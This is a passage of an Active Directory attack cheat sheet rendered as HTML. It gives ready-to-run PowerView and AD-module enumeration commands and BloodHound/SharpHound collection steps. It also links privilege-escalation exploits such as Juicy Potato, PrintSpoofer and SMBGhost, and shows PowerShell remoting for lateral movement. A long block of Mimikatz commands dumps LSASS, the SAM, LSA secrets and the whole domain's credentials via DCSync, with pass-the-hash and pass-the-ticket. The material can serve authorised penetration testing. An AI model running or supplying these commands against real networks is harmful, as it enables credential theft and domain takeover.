<a href="#__codelineno-6-7" id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="nb">Get-DomainGPOComputerLocalGroupMapping</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
</code></pre></div> <ul> <li><strong>Enum OUs:</strong> <div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="nb">Get-DomainOU</span> <span class="n">-Properties</span> <span class="n">Name</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">Name</span>
</code></pre></div></li> <li><strong>Enum ACLs:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c"># Returns the ACLs associated with the specified account</span>
<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="nb">Get-DomaiObjectAcl</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">AccountName</span><span class="p">&gt;</span> <span class="n">-ResolveGUIDs</span>
<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>
<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c">#Search for interesting ACEs</span>
<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="nb">Find-InterestingDomainAcl</span> <span class="n">-ResolveGUIDs</span>
<a href="#__codelineno-8-6" id="__codelineno-8-6" name="__codelineno-8-6"></a>
<a href="#__codelineno-8-7" id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="c">#Check the ACLs associated with a specified path (e.g smb share)</span>
<a href="#__codelineno-8-8" id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="nb">Get-PathAcl</span> <span class="n">-Path</span> <span class="s2">"\\Path\Of\A\Share"</span>
</code></pre></div> <ul> <li><strong>Enum Domain Trust:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="nb">Get-DomainTrust</span>
<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nb">Get-DomainTrust</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>
<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="c">#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds</span>
<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="nb">Get-DomainTrustMapping</span>
</code></pre></div> <ul> <li><strong>Enum Forest Trust:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="nb">Get-ForestDomain</span>
<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="nb">Get-ForestDomain</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>
<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="c">#Map the Trust of the Forest</span>
<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="nb">Get-ForestTrust</span>
<a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="nb">Get-ForestTrust</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
</code></pre></div> <ul> <li><strong>User Hunting:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c">#Finds all machines on the current domain where the current user has local admin access</span>
<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="nb">Find-LocalAdminAccess</span> <span class="n">-Verbose</span>
<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a>
<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="c">#Find local admins on all machines of the domain</span>
<a href="#__codelineno-11-5" id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="nb">Find-DomainLocalGroupMember</span> <span class="n">-Verbose</span>
<a href="#__codelineno-11-6" id="__codelineno-11-6" name="__codelineno-11-6"></a>
<a href="#__codelineno-11-7" id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="c">#Find computers were a Domain Admin OR a spesified user has a session</span>
<a href="#__codelineno-11-8" id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="nb">Find-DomainUserLocation</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">UserName</span><span class="p">,</span> <span class="n">SessionFromName</span>
<a href="#__codelineno-11-9" id="__codelineno-11-9" name="__codelineno-11-9"></a>
<a href="#__codelineno-11-10" id="__codelineno-11-10" name="__codelineno-11-10"></a><span class="c">#Confirming admin access</span>
<a href="#__codelineno-11-11" id="__codelineno-11-11" name="__codelineno-11-11"></a><span class="nb">Test-AdminAccess</span>
</code></pre></div> <p><strong>Priv Esc to Domain Admin with User Hunting:</strong> I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; Profit!</p> <h3 id="using-ad-module">Using AD Module<a class="headerlink" href="#using-ad-module" title="Permanent link"></a></h3> <ul> <li><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></li> <li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li> <li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li> <li><strong>Get Domain Controlers:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="nb">Get-ADDomainController</span>
<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="nb">Get-ADDomainController</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div> <ul> <li><strong>Enumerate Domain Users:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="p">*</span>
<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a>
<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="c">#Get a spesific "string" on a user's attribute</span>
<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">'Description -like "*wtver*"'</span> <span class="n">-Properties</span> <span class="n">Description</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span> <span class="n">Description</span>
</code></pre></div> <ul> <li><strong>Enum Domain Computers:</strong> <div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="p">*</span>
<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="nb">Get-ADGroup</span> <span class="n">-Filter</span> <span class="p">*</span>
</code></pre></div></li> <li><strong>Enum Domain Trust:</strong> <div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="nb">Get-ADTrust</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div></li> <li><strong>Enum Forest Trust:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="nb">Get-ADForest</span>
<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="nb">Get-ADForest</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a>
<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="c">#Domains of Forest Enumeration</span>
<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">Domains</span>
</code></pre></div> <ul> <li><strong>Enum Local AppLocker Effective Policy:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="nb">Get-AppLockerPolicy</span> <span class="n">-Effective</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">RuleCollections</span>
</code></pre></div> <h3 id="using-bloodhound">Using BloodHound<a class="headerlink" href="#using-bloodhound" title="Permanent link"></a></h3> <h4 id="remote-bloodhound">Remote BloodHound<a class="headerlink" href="#remote-bloodhound" title="Permanent link"></a></h4> <p><a href="https://github.com/fox-it/BloodHound.py">Python BloodHound Repository</a> or install it with <code>pip3 install bloodhound</code></p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-18-1" id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="n">bloodhound-python</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="n">-ns</span> <span class="p">&lt;</span><span class="n">Domain</span> <span class="n">Controller</span><span class="err">'</span><span class="n">s</span> <span class="n">Ip</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="n">All</span>
</code></pre></div> <h4 id="on-site-bloodhound">On Site BloodHound<a class="headerlink" href="#on-site-bloodhound" title="Permanent link"></a></h4> <div class="highlight"><pre><span></span><code><a href="#__codelineno-19-1" id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="c">#Using exe ingestor</span>
<a href="#__codelineno-19-2" id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-domain</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-domaincontroller</span> <span class="p">&lt;</span><span class="n">Domain</span> <span class="n">Controller</span><span class="err">'</span><span class="n">s</span> <span class="n">Ip</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
<a href="#__codelineno-19-3" id="__codelineno-19-3" name="__codelineno-19-3"></a>
<a href="#__codelineno-19-4" id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="c">#Using PowerShell module ingestor</span>
<a href="#__codelineno-19-5" id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="p">.</span> <span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span>
<a href="#__codelineno-19-6" id="__codelineno-19-6" name="__codelineno-19-6"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
</code></pre></div> <h3 id="useful-enumeration-tools">Useful Enumeration Tools<a class="headerlink" href="#useful-enumeration-tools" title="Permanent link"></a></h3> <ul> <li><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a> Information dumper via LDAP</li> <li><a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> Integrated DNS dumping by any authenticated user</li> <li><a href="https://github.com/cyberark/ACLight">ACLight</a> Advanced Discovery of Privileged Accounts</li> <li><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a> Detailed Active Directory Recon Tool</li> </ul> <h2 id="local-privilege-escalation">Local Privilege Escalation<a class="headerlink" href="#local-privilege-escalation" title="Permanent link"></a></h2> <ul> <li> <p><a href="https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet">Windows Privilege Escalation CheatSheet</a> Cheat Sheet for Windows Local Privilege Escalations</p> </li> <li> <p><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p> </li> </ul> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/26a0.svg" title=":warning:"/> Works only until Windows Server 2016 and Windows 10 until patch 1803</p> <ul> <li><a href="https://github.com/TsukiCTF/Lovely-Potato">Lovely Potato</a> Automated Juicy Potato</li> </ul> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/26a0.svg" title=":warning:"/> Works only until Windows Server 2016 and Windows 10 until patch 1803</p> <ul> <li><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</li> </ul> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f64f.svg" title=":pray:"/> Works for Windows Server 2019 and Windows 10</p> <ul> <li><a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> Upgraded Juicy Potato</li> </ul> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f64f.svg" title=":pray:"/> Works for Windows Server 2019 and Windows 10</p> <ul> <li><a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">Abusing Token Privileges</a></li> <li><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">SMBGhost CVE-2020-0796</a> \ <a href="https://github.com/danigargu/CVE-2020-0796">PoC</a></li> <li><a href="https://github.com/cube0x0/CVE-2021-36934">CVE-2021-36934 (HiveNightmare/SeriousSAM)</a></li> </ul> <h3 id="useful-local-priv-esc-tools">Useful Local Priv Esc Tools<a class="headerlink" href="#useful-local-priv-esc-tools" title="Permanent link"></a></h3> <ul> <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp</a> Misconfiguration Abuse</li> <li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot</a> General Priv Esc Enumeration Tool</li> <li><a href="https://github.com/enjoiz/Privesc">Privesc</a> General Priv Esc Enumeration Tool</li> <li><a href="https://github.com/itm4n/FullPowers">FullPowers</a> Restore A Service Account's Privileges</li> </ul> <h2 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link"></a></h2> <h3 id="powershell-remoting">PowerShell Remoting<a class="headerlink" href="#powershell-remoting" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-20-1" id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="c">#Enable PowerShell Remoting on current Machine (Needs Admin Access)</span>
<a href="#__codelineno-20-2" id="__codelineno-20-2" name="__codelineno-20-2"></a><span class="nb">Enable-PSRemoting</span>
<a href="#__codelineno-20-3" id="__codelineno-20-3" name="__codelineno-20-3"></a>
<a href="#__codelineno-20-4" id="__codelineno-20-4" name="__codelineno-20-4"></a><span class="c">#Entering or Starting a new PSSession (Needs Admin Access)</span>
<a href="#__codelineno-20-5" id="__codelineno-20-5" name="__codelineno-20-5"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">Name</span><span class="p">&gt;</span>
<a href="#__codelineno-20-6" id="__codelineno-20-6" name="__codelineno-20-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">Name</span><span class="p">&gt;</span> <span class="n">OR</span> <span class="n">-Sessions</span> <span class="p">&lt;</span><span class="n">SessionName</span><span class="p">&gt;</span>
</code></pre></div> <h3 id="remote-code-execution-with-ps-credentials">Remote Code Execution with PS Credentials<a class="headerlink" href="#remote-code-execution-with-ps-credentials" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-21-1" id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">'&lt;Wtver&gt;'</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a href="#__codelineno-21-2" id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">'xyz.local\&lt;WtverUser&gt;'</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
<a href="#__codelineno-21-3" id="__codelineno-21-3" name="__codelineno-21-3"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">WtverMachine</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="n">whoami</span><span class="p">}</span>
</code></pre></div> <h3 id="import-a-powershell-module-and-execute-its-functions-remotely">Import a PowerShell Module and Execute its Functions Remotely<a class="headerlink" href="#import-a-powershell-module-and-execute-its-functions-remotely" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-22-1" id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="c">#Execute the command and start a session</span>
<a href="#__codelineno-22-2" id="__codelineno-22-2" name="__codelineno-22-2"></a><span class="nb">Invoke-Command</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfComputer</span><span class="p">&gt;</span> <span class="n">-FilePath</span> <span class="n">c</span><span class="p">:\</span><span class="n">FilePath</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Session</span> <span class="nv">$sess</span>
<a href="#__codelineno-22-3" id="__codelineno-22-3" name="__codelineno-22-3"></a>
<a href="#__codelineno-22-4" id="__codelineno-22-4" name="__codelineno-22-4"></a><span class="c">#Interact with the session</span>
<a href="#__codelineno-22-5" id="__codelineno-22-5" name="__codelineno-22-5"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</code></pre></div> <h3 id="executing-remote-stateful-commands">Executing Remote Stateful commands<a class="headerlink" href="#executing-remote-stateful-commands" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-23-1" id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="c">#Create a new session</span>
<a href="#__codelineno-23-2" id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfComputer</span><span class="p">&gt;</span>
<a href="#__codelineno-23-3" id="__codelineno-23-3" name="__codelineno-23-3"></a>
<a href="#__codelineno-23-4" id="__codelineno-23-4" name="__codelineno-23-4"></a><span class="c">#Execute command on the session</span>
<a href="#__codelineno-23-5" id="__codelineno-23-5" name="__codelineno-23-5"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$ps</span> <span class="p">=</span> <span class="nb">Get-Process</span><span class="p">}</span>
<a href="#__codelineno-23-6" id="__codelineno-23-6" name="__codelineno-23-6"></a>
<a href="#__codelineno-23-7" id="__codelineno-23-7" name="__codelineno-23-7"></a><span class="c">#Check the result of the command to confirm we have an interactive session</span>
<a href="#__codelineno-23-8" id="__codelineno-23-8" name="__codelineno-23-8"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$ps</span><span class="p">}</span>
</code></pre></div> <h3 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link"></a></h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-24-1" id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="c">#The commands are in cobalt strike format!</span>
<a href="#__codelineno-24-2" id="__codelineno-24-2" name="__codelineno-24-2"></a>
<a href="#__codelineno-24-3" id="__codelineno-24-3" name="__codelineno-24-3"></a><span class="c">#Dump LSASS:</span>
<a href="#__codelineno-24-4" id="__codelineno-24-4" name="__codelineno-24-4"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a href="#__codelineno-24-5" id="__codelineno-24-5" name="__codelineno-24-5"></a><span class="n">mimikatz</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
<a href="#__codelineno-24-6" id="__codelineno-24-6" name="__codelineno-24-6"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>
<a href="#__codelineno-24-7" id="__codelineno-24-7" name="__codelineno-24-7"></a>
<a href="#__codelineno-24-8" id="__codelineno-24-8" name="__codelineno-24-8"></a><span class="c">#(Over) Pass The Hash</span>
<a href="#__codelineno-24-9" id="__codelineno-24-9" name="__codelineno-24-9"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a href="#__codelineno-24-10" id="__codelineno-24-10" name="__codelineno-24-10"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:&lt;&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainFQDN</span><span class="p">&gt;</span>
<a href="#__codelineno-24-11" id="__codelineno-24-11" name="__codelineno-24-11"></a>
<a href="#__codelineno-24-12" id="__codelineno-24-12" name="__codelineno-24-12"></a><span class="c">#List all available kerberos tickets in memory</span>
<a href="#__codelineno-24-13" id="__codelineno-24-13" name="__codelineno-24-13"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span>
<a href="#__codelineno-24-14" id="__codelineno-24-14" name="__codelineno-24-14"></a>
<a href="#__codelineno-24-15" id="__codelineno-24-15" name="__codelineno-24-15"></a><span class="c">#Dump local Terminal Services credentials</span>
<a href="#__codelineno-24-16" id="__codelineno-24-16" name="__codelineno-24-16"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tspkg</span>
<a href="#__codelineno-24-17" id="__codelineno-24-17" name="__codelineno-24-17"></a>
<a href="#__codelineno-24-18" id="__codelineno-24-18" name="__codelineno-24-18"></a><span class="c">#Dump and save LSASS in a file</span>
<a href="#__codelineno-24-19" id="__codelineno-24-19" name="__codelineno-24-19"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
<a href="#__codelineno-24-20" id="__codelineno-24-20" name="__codelineno-24-20"></a>
<a href="#__codelineno-24-21" id="__codelineno-24-21" name="__codelineno-24-21"></a><span class="c">#List cached MasterKeys</span>
<a href="#__codelineno-24-22" id="__codelineno-24-22" name="__codelineno-24-22"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">dpapi</span>
<a href="#__codelineno-24-23" id="__codelineno-24-23" name="__codelineno-24-23"></a>
<a href="#__codelineno-24-24" id="__codelineno-24-24" name="__codelineno-24-24"></a><span class="c">#List local Kerberos AES Keys</span>
<a href="#__codelineno-24-25" id="__codelineno-24-25" name="__codelineno-24-25"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">ekeys</span>
<a href="#__codelineno-24-26" id="__codelineno-24-26" name="__codelineno-24-26"></a>
<a href="#__codelineno-24-27" id="__codelineno-24-27" name="__codelineno-24-27"></a><span class="c">#Dump SAM Database</span>
<a href="#__codelineno-24-28" id="__codelineno-24-28" name="__codelineno-24-28"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>
<a href="#__codelineno-24-29" id="__codelineno-24-29" name="__codelineno-24-29"></a>
<a href="#__codelineno-24-30" id="__codelineno-24-30" name="__codelineno-24-30"></a><span class="c">#Dump SECRETS Database</span>
<a href="#__codelineno-24-31" id="__codelineno-24-31" name="__codelineno-24-31"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
<a href="#__codelineno-24-32" id="__codelineno-24-32" name="__codelineno-24-32"></a>
<a href="#__codelineno-24-33" id="__codelineno-24-33" name="__codelineno-24-33"></a><span class="c">#Inject and dump the Domain Controler's Credentials</span>
<a href="#__codelineno-24-34" id="__codelineno-24-34" name="__codelineno-24-34"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a href="#__codelineno-24-35" id="__codelineno-24-35" name="__codelineno-24-35"></a><span class="n">mimikatz</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
<a href="#__codelineno-24-36" id="__codelineno-24-36" name="__codelineno-24-36"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span>
<a href="#__codelineno-24-37" id="__codelineno-24-37" name="__codelineno-24-37"></a>
<a href="#__codelineno-24-38" id="__codelineno-24-38" name="__codelineno-24-38"></a><span class="c">#Dump the Domain's Credentials without touching DC's LSASS and also remotely</span>
<a href="#__codelineno-24-39" id="__codelineno-24-39" name="__codelineno-24-39"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainFQDN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">all</span>
<a href="#__codelineno-24-40" id="__codelineno-24-40" name="__codelineno-24-40"></a>
<a href="#__codelineno-24-41" id="__codelineno-24-41" name="__codelineno-24-41"></a><span class="c">#List and Dump local kerberos credentials</span>
<a href="#__codelineno-24-42" id="__codelineno-24-42" name="__codelineno-24-42"></a><span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">list</span> <span class="p">/</span><span class="n">dump</span>
<a href="#__codelineno-24-43" id="__codelineno-24-43" name="__codelineno-24-43"></a>
<a href="#__codelineno-24-44" id="__codelineno-24-44" name="__codelineno-24-44"></a><span class="c">#Pass The Ticket</span>
<a href="#__codelineno-24-45" id="__codelineno-24-45" name="__codelineno-24-45"></a><span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">&lt;</span><span class="n">PathToKirbiFile</span><span class="p">&gt;</span>
<a href="#__codelineno-24-46" id="__codelineno-24-46" name="__codelineno-24-46"></a>
<a href="#__codelineno-24-47" id="__codelineno-24-47" name="__codelineno-24-47"></a><span class="c">#List TS/RDP sessions</span>
<a href="#__codelineno-24-48" id="__codelineno-24-48" name="__codelineno-24-48"></a><span class="n">mimikatz</span> <span class="n">ts</span><span class="p">::</span><span class="n">sessions</span>
<a href="#__codelineno-24-49" id="__codelineno-24-49" name="__codelineno-24-49"></a>
<a href="#__codelineno-24-50" id="__codelineno-24-50" name="__codelineno-24-50"></a><span class="c">#List Vault credentials</span>
<a href="#__codelineno-24-51" id="__codelineno-24-51" name="__codelineno-24-51"></a><span class="n">mimikatz</span> <span class="n">vault</span><span class="p">::</span><span class="n">list</span>
</code></pre></div> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/2757.svg" title=":exclamation:"/> What if mimikatz fails to dump credentials because of LSA Protection controls ?</p> <ul> <li>LSA as a Protected Process (Kernel Land Bypass)</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-25-1" id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="c">#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1</span>
<a href="#__codelineno-25-2" id="__codelineno-25-2" name="__codelineno-25-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span>
